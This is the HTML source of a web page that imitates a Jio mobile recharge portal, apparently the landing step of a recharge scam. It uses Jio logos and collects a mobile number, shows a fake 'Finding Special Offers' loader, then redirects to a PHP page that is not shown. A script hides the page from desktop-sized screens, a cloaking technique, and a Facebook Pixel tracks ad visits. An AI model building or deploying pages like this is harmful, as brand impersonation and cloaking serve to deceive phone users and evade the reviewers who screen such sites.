<!DOCTYPE html>
<html lang="en">
  <head>
    <script>
      // Function to check screen size and show/hide content
      function checkDevice() {
        if (window.innerWidth <= 768) {
          document.body.style.display = "block"; // Show content
        } else {
          document.body.style.display = "none"; // Hide content
        }
      } 

      // Run check on page load and window resize
      window.onload = checkDevice;
      window.onresize = checkDevice;
    </script>

    <meta
      http-equiv="Cache-Control"
      content="no-cache, no-store, must-revalidate"
    />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />

    <script>
      !(function (f, b, e, v, n, t, s) {
        if (f.fbq) return;
        n = f.fbq = function () {
          n.callMethod
            ? n.callMethod.apply(n, arguments)
            : n.queue.push(arguments);
        };
        if (!f._fbq) f._fbq = n;
        n.push = n;
        n.loaded = !0;
        n.version = "2.0";
        n.queue = [];
        t = b.createElement(e);
        t.async = !0;
        t.src = v;
        s = b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t, s);
      })(
        window,
        document,
        "script",
        "https://connect.facebook.net/en_US/fbevents.js"
      );

      fbq("init", "1336657810880525"); // Facebook Pixel ID
      fbq("track", "PageView");
    </script>

    <noscript>
      <img
        height="1"
        width="1"
        style="display: none"
        src="https://www.facebook.com/tr?id=1336657810880525&ev=PageView&noscript=1"
      />
    </noscript>

    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Mobile Recharge</title>

    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com?plugins=forms,typography"></script>

    <style>
      /* Loader Animation */
      .loader {
        border: 5px solid #f3f3f3;
        border-radius: 50%;
        border-top: 5px solid #3498db;
        width: 40px;
        height: 40px;
        animation: spin 1s linear infinite;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      .hidden {
        display: none;
      }
    </style>
  </head>

  <body>
    <div class="min-h-screen bg-zinc-100 flex flex-col items-center">
      <!-- Header -->
      <div class="bg-blue-700 w-full p-4 flex justify-between items-center">
        <img
          src="./recharge/images/logo.830d463ac6b62d8cd9f6.png"
          alt="Jio Logo"
          width="35"
          height="35"
        />
        <div class="relative w-3/4">
          <input
            type="text"
            placeholder="Search"
            class="w-full p-2 pl-10 rounded-full bg-blue-800 text-white placeholder-white focus:outline-none"
          />
        </div>
      </div>

      <!-- Centered Logo -->
      <div class="bg-blue-700 w-full flex justify-center py-8">
        <img src="./images/lgg.png" alt="Jio Logo" width="100" height="100" />
      </div>

      <!-- Status Message -->
      <div id="statusMessage" class="hidden text-center mt-6">
        <p id="checkingText" class="text-blue-700 font-semibold mb-4">
          Checking Your Number...
        </p>
        <div id="loading" class="hidden">
          <div class="loader mx-auto"></div>
          <p class="text-blue-700 font-semibold mt-2">
            Finding Special Offers...
          </p>
        </div>
      </div>

      <!-- Recharge Form -->
      <div
        class="bg-white w-11/12 md:w-1/2 lg:w-1/3 p-6 rounded-lg shadow-lg mt-6"
      >
        <h2 class="text-xl font-semibold text-center text-blue-700 mb-4">
          Mobile Recharge
        </h2>
        <form id="myForm">
          <div class="mb-4">
            <label class="block text-zinc-700 font-semibold mb-2"
              >Operator</label
            >
            <select
              name="operator"
              class="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
            >
              <option>Jio Prepaid</option>
              <option>Jio Postpaid</option>
            </select>
          </div>
          <div class="mb-4">
            <label class="block text-zinc-700 font-semibold mb-2"
              >Mobile Number</label
            >
            <input
              id="mobileNumber"
              name="mobileNumber"
              type="text"
              maxlength="10"
              placeholder="Enter 10 digit mobile number"
              oninput="validateMobileNumber(this)"
              class="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
          </div>
          <button
            type="submit"
            class="bg-[#0a2885] py-4 w-full text-[16px] rounded-full font-bold text-white"
          >
            Recharge
          </button>
        </form>
      </div>
    </div>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const statusMessage = document.getElementById("statusMessage");
        const checkingText = document.getElementById("checkingText");
        const loading = document.getElementById("loading");

        statusMessage.classList.add("hidden");
        checkingText.classList.add("hidden");
        loading.classList.add("hidden");

        sessionStorage.removeItem("loaderState");
      });

      function validateMobileNumber(input) {
        input.value = input.value.replace(/[^0-9]/g, "");
      }

      document
        .getElementById("myForm")
        .addEventListener("submit", function (event) {
          event.preventDefault();

          const statusMessage = document.getElementById("statusMessage");
          const checkingText = document.getElementById("checkingText");
          const loading = document.getElementById("loading");
          const mobileNumber = document
            .getElementById("mobileNumber")
            .value.trim();

          if (mobileNumber === "" || mobileNumber.length !== 10) {
            alert("Please enter a valid 10-digit mobile number.");
            return;
          }

          sessionStorage.removeItem("loaderState");

          statusMessage.classList.remove("hidden");
          checkingText.classList.remove("hidden");

          sessionStorage.setItem("loaderState", "active");

          setTimeout(() => {
            checkingText.classList.add("hidden");
            loading.classList.remove("hidden");

            setTimeout(() => {
              sessionStorage.removeItem("loaderState");
              statusMessage.classList.add("hidden");
              checkingText.classList.add("hidden");
              loading.classList.add("hidden");

              window.location.href = "./recharge/index.php"; // ✅ Corrected redirection path
            }, 2000);
          }, 500);
        });
    </script>
  </body>
</html>
